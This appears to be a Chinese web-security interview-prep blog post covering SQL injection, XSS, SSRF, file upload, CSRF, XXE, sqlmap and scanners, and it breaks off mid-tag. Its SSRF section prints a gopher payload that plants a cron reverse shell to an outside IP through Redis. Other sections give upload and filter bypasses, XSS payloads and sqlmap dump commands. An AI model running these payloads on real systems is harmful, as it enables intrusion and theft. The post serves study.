title=\"TCP&#x2F;IP五层模型\"></a>TCP&#x2F;IP五层模型</h3><h4 id=\"区别\"><a href=\"#区别\" class=\"headerlink\" title=\"区别\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png\"\n                        alt=\"图片-1685330444867\"\n                 >区别</h4><p>TCP&#x2F;IP协议中的应用层处理开放式系统互联模型（OSI）中的第五层、第六层和第七层的功能。</p>\n<p>TCP&#x2F;IP协议中的传输层不能保证数据包在该层总是能够安全可靠地传输，而开放式系统互联模型（OSI）可以做到。</p>\n<p>TCP&#x2F;IP协议还提供一项名为UDP（用户数据报协议）的选择。</p>\n<h3 id=\"xss，csrf，ssrf区别\"><a href=\"#xss，csrf，ssrf区别\" class=\"headerlink\" title=\"xss，csrf，ssrf区别\"></a>xss，csrf，ssrf区别</h3><p><strong>相同点：</strong><br> XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p>\n<p><strong>不同点：</strong><br> XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。</p>\n<p>CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。  </p>\n<p>SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"面试prepare\"><a href=\"#面试prepare\" class=\"headerlink\" title=\"面试prepare\"></a>面试prepare</h1><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>本人最近准备找一份暑期实习，于是自己写了一份面经</p>\n<p>写的不好，仅供参考</p>\n<h3 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h3><h4 id=\"常见的关系型数据库\"><a href=\"#常见的关系型数据库\" class=\"headerlink\" title=\"常见的关系型数据库\"></a><strong>常见的关系型数据库</strong></h4><p>mysql、sqlserver、oracle、access、sqlite、postgreSQL</p>\n<ul>\n<li><p>mysql:3306 </p>\n</li>\n<li><p>sqlserver:1433 </p>\n</li>\n<li><p>orecal:1521 </p>\n</li>\n<li><p>PostgreSQL:5432 </p>\n</li>\n<li><p>db2:50000</p>\n</li>\n<li><p>MongoDB:27017 </p>\n</li>\n<li><p>redis:6379 </p>\n</li>\n<li><p>memcached:11211</p>\n</li>\n</ul>\n<h4 id=\"SQL注入有哪几种注入类型？\"><a href=\"#SQL注入有哪几种注入类型？\" class=\"headerlink\" title=\"SQL注入有哪几种注入类型？\"></a><strong>SQL注入有哪几种注入类型？</strong></h4><p>从注入参数类型分：数字型注入、字符型注入、搜索型注入<br>从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入 ，</p>\n<p>二次注入（参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入）</p>\n<p>从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入</p>\n<h4 id=\"SQL注入的危害及防御\"><a href=\"#SQL注入的危害及防御\" class=\"headerlink\" title=\"SQL注入的危害及防御\"></a><strong>SQL注入的危害及防御</strong></h4><p>危害</p>\n<ul>\n<li>数据库泄露 </li>\n<li>数据库被破坏 </li>\n<li>网站崩溃 </li>\n<li>服务器被植入木马</li>\n</ul>\n<p>防御</p>\n<ul>\n<li>代码层面对查询参数进行转义 </li>\n<li>预编译与参数绑定 </li>\n<li>利用WAF防御</li>\n</ul>\n<h4 id=\"sql注入getshell\"><a href=\"#sql注入getshell\" class=\"headerlink\" title=\"sql注入getshell\"></a>sql注入getshell</h4><ul>\n<li>存在SQL注入漏洞</li>\n<li>web目录具有写入权限</li>\n<li>找到网站的绝对路径</li>\n<li>secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）</li>\n</ul>\n<h4 id=\"绕过方式\"><a href=\"#绕过方式\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h4><ul>\n<li>大小写</li>\n<li>双写</li>\n<li>注释符  &#x2F;**&#x2F;</li>\n<li>编码绕过 %20 %09 %0a</li>\n<li>括号绕过</li>\n<li>将表明转为十六进制绕过引号</li>\n<li>join绕过逗号</li>\n<li>like绕过等于号</li>\n</ul>\n<h3 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h3><h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>xss的本质是javascript代码执行，所以说原理就是用户在可控参数输入恶意的js代码，然后该代码被执行成功</p>\n<h4 id=\"如何验证存在xss漏洞\"><a href=\"#如何验证存在xss漏洞\" class=\"headerlink\" title=\"如何验证存在xss漏洞\"></a>如何验证存在xss漏洞</h4><p>第一步，寻找用户可控的参数（输入点）<br> 第二步，测试特殊符号，单引号、双引号、尖括号等是否被过滤或处理<br> 第三步，根据第二步测试结果进行操作，如过滤了事件类型的关键字，构造新的script标签去形成新的js环境，或者针对一些其它防护进行绕过</p>\n<h4 id=\"xss有哪几种类型\"><a href=\"#xss有哪几种类型\" class=\"headerlink\" title=\"xss有哪几种类型\"></a>xss有哪几种类型</h4><h5 id=\"DOM型XSS\"><a href=\"#DOM型XSS\" class=\"headerlink\" title=\"DOM型XSS\"></a>DOM型XSS</h5><p>攻击者将带有恶意js代码的参数传递到网站的前端页面中，该代码不会传入服务器直接在客户的浏览器执行。</p>\n<h5 id=\"反射性型XSS\"><a href=\"#反射性型XSS\" class=\"headerlink\" title=\"反射性型XSS\"></a>反射性型XSS</h5><p>攻击者将带有恶意js代码的参数传递给网站，经过服务器的然后返回到客户端，在客户的浏览器执行。</p>\n<h5 id=\"存储型XSS\"><a href=\"#存储型XSS\" class=\"headerlink\" title=\"存储型XSS\"></a>存储型XSS</h5><p>攻击者将带有恶意js代码的参数传递给网站，经过服务器存储在数据库中，任何一个客户端在访问该条数据时，恶意的js代码都会在该客户端的浏览器执行。</p>\n<h4 id=\"xss危害\"><a href=\"#xss危害\" class=\"headerlink\" title=\"xss危害\"></a>xss危害</h4><ul>\n<li>盗用用户的COOKIE</li>\n<li>修改DOM</li>\n<li>插入广告（黑页等）</li>\n<li>发动xss蠕虫攻击</li>\n<li>劫持用户行为，进一步渗透内网</li>\n</ul>\n<h4 id=\"xss修复\"><a href=\"#xss修复\" class=\"headerlink\" title=\"xss修复\"></a>xss修复</h4><ul>\n<li>在服务端进行输入检测，过滤特殊字符</li>\n<li>对输出内容进行编码转义</li>\n<li>在html中进行HTMLEncode，javascript中进行JavaScriptEncode，对使用javascriptEncode的变量都放在引号中并转义特殊字符，data部分就无法逃逸出引号成为代码中的一部分了，再严格一些，对所有字母之外的字符使用十六进制编码。</li>\n<li>设置httponly为true</li>\n</ul>\n<h4 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><ul>\n<li><p>双写</p>\n</li>\n<li><p>对不能构造script标签的情况下<br>使用事件进行绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input  value=&#x27;123&#x27; onclick=&#x27;alert()&#x27;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>超链接绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a src=javascript:alert()&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><h4 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>\n<h4 id=\"危害\"><a href=\"#危害\" class=\"headerlink\" title=\"危害\"></a>危害</h4><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>\n<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>\n<h4 id=\"利用方式\"><a href=\"#利用方式\" class=\"headerlink\" title=\"利用方式\"></a>利用方式</h4><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p>\n<p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"绕过-1\"><a href=\"#绕过-1\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><p>采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成</p>\n<blockquote>\n<ul>\n<li><p>8进制格式：0300.0250.0.1</p>\n</li>\n<li><p>16进制格式：0xC0.0xA8.0.1</p>\n</li>\n<li><p>10进制整数格式：3232235521</p>\n</li>\n<li><p>16进制整数格式：0xC0A80001</p>\n</li>\n<li><p>合并后两位：1.1.278 &#x2F; 1.1.755</p>\n</li>\n<li><p>合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</p>\n</li>\n<li><p>0.0.0.0这个IP可以直接访问到本地</p>\n</li>\n<li><p><code>xip.io</code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，</p>\n<p>例如192.168.0.1.xip.io，解析到192.168.0.1。</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"防御方式\"><a href=\"#防御方式\" class=\"headerlink\" title=\"防御方式\"></a>防御方式</h4><blockquote>\n<ul>\n<li>过滤返回的信息</li>\n<li>统一错误信息</li>\n<li>限制请求的端口</li>\n<li>禁止不常用的协议</li>\n<li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单</li>\n</ul>\n</blockquote>\n<ol>\n<li>限制访问方法只能使用GET</li>\n<li>限制访问的协议只能是http或https，其他协议直接拒绝访问</li>\n<li>检测特殊字符CRLF，存在则直接拒绝访问</li>\n<li>设置setInstanceFollowRedirects属性为false，禁止跟随302跳转；禁止跳转的目的是防止攻击者利用跳转访问内网，从而绕过之后的黑名单校验</li>\n<li>解析url中域名对应的ipv4地址：   <ol>\n<li>该地址先过黑名单校验，不允许是内网地址，利用正则表达式对ip进行过滤</li>\n<li><strong>使用ip对url中的域名进行替换，访问资源时都以ip进行访问</strong>；这样可以防御DNS Rebinding类的攻击</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><h4 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h4><p>用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端的命令。</p>\n<pre><code>常见的安全问题：\n（1）上传的是脚本文件，服务器Web容器解释并执行了用户上传的脚本，导致代码执行。\n（2）上传的文件是病毒、木马，引诱用户或者管理员进行下载执行。\n（3）上传文件是钓鱼图片或者为包含了脚本的图片，在某些版本的浏览器中作为脚本执行，或被用于钓鱼欺诈。\n</code></pre>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png\"\n                        alt=\"图片-1685330394483\"\n                 ></p>\n<h4 id=\"文件上传漏洞方式\"><a href=\"#文件上传漏洞方式\" class=\"headerlink\" title=\"文件上传漏洞方式\"></a>文件上传漏洞方式</h4><p>1.客户端方式</p>\n<p>主要方式就是JS检查。<br>绕过：<br>（1）首先选择正常的文件进行上传<br>（2）用BurpSuit进行抓包修改后缀然后完成文件上传.<br>2.绕过文件上传检查功能<br>（1）白名单校对——%00截断</p>\n<p>因为在很多语言中，比如CorPHP等语言的常用字符串处理函数中,0x00都被认为是终止符。如xxx.php%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为0x00字符截断的关系，最终会变成xxx.php。<br>原理：URL中%00转换为ASCII字符是0，而ASCII中的0作为特殊字符保留，表示字符串结束。</p>\n<h4 id=\"绕过-2\"><a href=\"#绕过-2\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><h5 id=\"htaccess文件\"><a href=\"#htaccess文件\" class=\"headerlink\" title=\".htaccess文件\"></a>.htaccess文件</h5><blockquote>\n<p>htaccess 在站点的根目录下面，不是在<a class=\"link\"   href=\"https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020\" >apache<i class=\"fas fa-external-link-alt\"></i></a>目录下，但是它属于apache的一个配置文件</p>\n</blockquote>\n<p>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p>\n<h5 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h5><p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto_prepend_file = &lt;filename&gt;         //包含在文件头</span><br><span class=\"line\">auto_append_file = &lt;filename&gt;          //包含在文件尾</span><br></pre></td></tr></table></figure>\n\n<p>于是我们可以先上传.user.ini，然后上传一句话木马，让所有文件都包含了一句话木马</p>\n<h5 id=\"前端js绕过\"><a href=\"#前端js绕过\" class=\"headerlink\" title=\"前端js绕过\"></a>前端js绕过</h5><p>抓包直接修改</p>\n<h5 id=\"黑白名单绕过可以上传\"><a href=\"#黑白名单绕过可以上传\" class=\"headerlink\" title=\"黑白名单绕过可以上传\"></a>黑白名单绕过可以上传</h5><p>phtml php3 php4 php5 Php php (空格) php.，pphphp</p>\n<h5 id=\"修改content-type-添加GIF89a头\"><a href=\"#修改content-type-添加GIF89a头\" class=\"headerlink\" title=\"修改content-type,添加GIF89a头\"></a>修改content-type,添加GIF89a头</h5><h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><h4 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>攻击者利用服务器对用户的信任，从而欺骗受害者去服务器上执行受害者不知情的请求。</p>\n<p>攻击者会伪造一个用户发送给服务器的正常链接，其核心主要是要和已登录（已认证）的用户去发请求。CSRF不需要知道用户的Cookie，CSRF自己并不会发请求给服务器，一切交给用户</p>\n<h4 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h4><p>（1）避免在URL中明文显示特定操作的参数内容；</p>\n<p>（2）使用同步令牌（Synchronizer Token）,检查客户端请求是否包含令牌及其有效性；（常用的做法，并且保证每次token的值完全随机且每次都不同）</p>\n<p>（3）检查Referer Header，拒绝来自非本网站的直接URL请求。</p>\n<p>（4）不要在客户端保存敏感信息（比如身份认证信息）；</p>\n<p>（5）设置会话过期机制，比如20分钟无操作，直接登录超时退出；</p>\n<p>（6）敏感信息的修改时需要对身份进行二次确认，比如修改账号时，需要判断旧密码；</p>\n<p>（7）敏感信息的修改使用post而不是get</p>\n<p>（8）避免交叉漏洞， 如XSS等</p>\n<p>（9）禁止跨域访问</p>\n<p>（10）在响应中设置CSP（Content-Security-Policy）内容安全策略</p>\n<h4 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h4><p>XXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时</p>\n<p>服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理</p>\n<p>导致可加载恶意外部文件 和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</p>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><h4 id=\"常用指令\"><a href=\"#常用指令\" class=\"headerlink\" title=\"常用指令\"></a>常用指令</h4><p>-h                                           显示基本帮助信息</p>\n<p>-hh                                         显示高级帮助信息</p>\n<p>–version                                显示版本号</p>\n<p>-v                                           详细等级（0-6 默认 1）<br>-u                                          指定目标url</p>\n<p>-d                                          直接连接数据库</p>\n<p>-l                                           从burp代理日志的解析目标</p>\n<p>-r                                           从文件中加载http请求</p>\n<p>-g                                          从google dork的结果作为目标url</p>\n<p>-c                                          从INI配置文件中加载选项</p>\n<ol>\n<li><p>–purge      【重新扫描（–purge 删除原先对该目标扫描的记录）</p>\n</li>\n<li><p>–tables      【获取表名</p>\n</li>\n<li><p>–dbs         【检测站点包含哪些数据库</p>\n</li>\n<li><p>–current-db    【获取当前的数据库名</p>\n</li>\n<li><p>–current-user  【检测当前用户</p>\n</li>\n<li><p>–is-dba   【判断站点的当前用户是否为数据库管理员</p>\n</li>\n<li><p>–batch      【默认确认，不询问你是否输入</p>\n</li>\n<li><p>–search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）</p>\n</li>\n<li><p>–threads 10  【线程，sqlmap线程最高设置为10</p>\n</li>\n<li><p>–level 3        【sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头<br>                       的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5</p>\n</li>\n<li><p>–risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>\n</li>\n<li><p>-v   【详细的等级(0-6)<br>  0：只显示Python的回溯，错误和关键消息。<br>  1：显示信息和警告消息。<br>  2：显示调试消息。<br>  3：有效载荷注入。<br>  4：显示HTTP请求。<br>  5：显示HTTP响应头。<br>  6：显示HTTP响应页面的内容</p>\n</li>\n<li><p>–privileges  【查看权限</p>\n</li>\n<li><p>–tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件</p>\n</li>\n<li><p>–method “POST” –data “page&#x3D;1&amp;id&#x3D;2”   【POST方式提交数据</p>\n</li>\n<li><p>–threads number　　【采用多线程 后接线程数</p>\n</li>\n<li><p>–referer  “”  【使用referer欺骗</p>\n</li>\n<li><p>–user-agent “”     【自定义user-agent</p>\n</li>\n<li><p>–proxy “目标地址″   【使用代理注入</p>\n</li>\n</ol>\n<p>1.指定目标url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.从文件中获取多个url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure>\n\n<p>3.从文件中加载HTTP请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>\n\n<p>4.利用google获取目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>5.从burp日志中获取目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -l    burp.txt</span><br></pre></td></tr></table></figure>\n\n<p>实例演示-sqlmap注入检测</p>\n<p>1.GET参数注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.POST参数注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol>\n<li><p>sqlmap -u  “<a class=\"link\"   href=\"http://www.xx.com/?id=x\" >http://www.xx.com?id=x<i class=\"fas fa-external-link-alt\"></i></a>“    【查询是否存在注入点</p>\n</li>\n<li><p>–dbs         【检测站点包含哪些数据库</p>\n</li>\n<li><p>–current-db    【获取当前的数据库名</p>\n</li>\n<li><p>–tables -D “db_name”  【获取指定数据库中的表名 -D后接指定的数据库名称</p>\n</li>\n<li><p>–columns  -T “table_name” -D “db_name”  【获取数据库表中的字段</p>\n</li>\n<li><p>–dump -C “columns_name” -T “table_name” -D “db_name”  【获取字段的数据内容</p>\n</li>\n</ol>\n<p>POST注入：</p>\n<pre><code>（1）目标地址http:// www.xxx.com /login.asp\n（2）打开brup代理。\n（3）点击表单提交\n（4）burp获取拦截信息（post）\n（5）右键保存文件（.txt）到指定目录下\n（6）运行sqlmap并执行如下命令：\n</code></pre>\n<p>用例：sqlmap -r okay.txt  -p  username</p>\n<p>&#x2F;&#x2F; -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>\n<h3 id=\"AWVS\"><a href=\"#AWVS\" class=\"headerlink\" title=\"AWVS\"></a>AWVS</h3><h4 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>Acunetix Web Vulnerability Scanner（AWVS）可以扫描任何通过Web浏览器访问和遵循HTTP&#x2F;HTTPS规则的Web站点。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。</p>\n<p>AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。</p>\n<h4 id=\"功能特点\"><a href=\"#功能特点\" class=\"headerlink\" title=\"功能特点\"></a>功能特点</h4><ul>\n<li><p>自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试</p>\n</li>\n<li><p>业内最先进且深入的SQL注入和跨站脚本测试</p>\n</li>\n<li><p>高级渗透测试工具，例如HTPP Editor和HTTP Fuzzer</p>\n</li>\n<li><p>可视化宏记录器帮助您轻松测试web表格和受密码保护的区域</p>\n</li>\n<li><p>支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制</p>\n</li>\n<li><p>丰富的报告功能，包括VISA PCI依从性报告</p>\n</li>\n<li><p>高速的多线程扫描器轻松检索成千上万的页面</p>\n</li>\n<li><p>智能爬行程序检测web服务器类型和应用程序语言</p>\n</li>\n<li><p>Acunetix检索并分析网站，包括flash内容，SOAP和AJAX</p>\n</li>\n<li><p>端口扫描web服务器并对在服务器上运行的网络服务执行安全检查</p>\n</li>\n<li><p>可到处网站漏洞文件</p>\n</li>\n</ul>\n<h4 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h4><ul>\n<li><p>扫描整个网络，通过跟踪站点上的所有链接和robots.txt来实现扫描，扫描后AWVS就会映射出站点的结构并显示每个文件的细节信息。</p>\n</li>\n<li><p>在上述的发现阶段或者扫描过程之后，AWVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。WVS分析每一个页面中需要输入数据的地方，进而尝试3所有的输入组合。这是一个自动扫描阶段 。</p>\n</li>\n<li><p>在它发现漏洞之后，AWVS就会在“Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。</p>\n</li>\n<li><p>在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描。</p>\n</li>\n</ul>\n<h4 id=\"页面介绍\"><a href=\"#页面介绍\" class=\"headerlink\" title=\"页面介绍\"></a>页面介绍</h4><p>主菜单功能介绍：主菜单共有5个模块，分别为Dashboard、Targets、Vulnerabilities、Scans和Reports。</p>\n<ul>\n<li>Dashboard：仪表盘，显示扫描过的网站的漏洞信息</li>\n<li>Targets：目标网站，需要被扫描的网站</li>\n<li>Vulnerabilities：漏洞，显示所有被扫描出来的网站漏洞</li>\n<li>Scans：扫描目标站点，从Target里面选择目标站点进行扫描</li>\n<li>Reports：漏洞扫描完成后生成的报告</li>\n</ul>\n<p>设置菜单功能介绍：设置菜单共有8个模块，分别为Users、Scan Types、Network Scanner、Issue Trackers、Email Settings、Engines、Excluded Hours、Proxy Settings</p>\n<ul>\n<li>Users：用户，添加网站的使用者、新增用户身份验证、用户登录会话和锁定设置</li>\n<li>Scan Types：扫描类型，可根据需要勾选完全扫描、高风险漏洞、跨站点脚本漏洞、SQL 注入漏洞、弱密码、仅爬网、恶意软件扫描</li>\n<li>Network Scanner：网络扫描仪，配置网络信息包括地址、用户名、密码、端口、协议</li>\n<li>Issue Trackers：问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等</li>\n<li>Email Settings：邮件设置，配置邮件发送信息</li>\n<li>Engines：引擎，引擎安装删除禁用设置</li>\n<li>Excluded Hours：扫描时间设置，可设置空闲时间扫描</li>\n<li>Proxy Settings：代理设置，设置代理服务器信息</li>\n</ul>\n<h3 id=\"APPSCAN\"><a href=\"#APPSCAN\" class=\"headerlink\" title=\"APPSCAN\"></a>APPSCAN</h3><h4 id=\"介绍-1\"><a href=\"#介绍-1\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>AppScan是IBM的一款web安全扫描工具，主要适用于Windows系统。该软件内置强大的扫描引擎，可以测试和评估Web服务和应用程序的风险检查，根据网站入口自动对网页链接进行安全扫描，扫描之后会提供扫描报告和修复建议等。</p>\n<h4 id=\"工作原理-1\"><a href=\"#工作原理-1\" class=\"headerlink\" 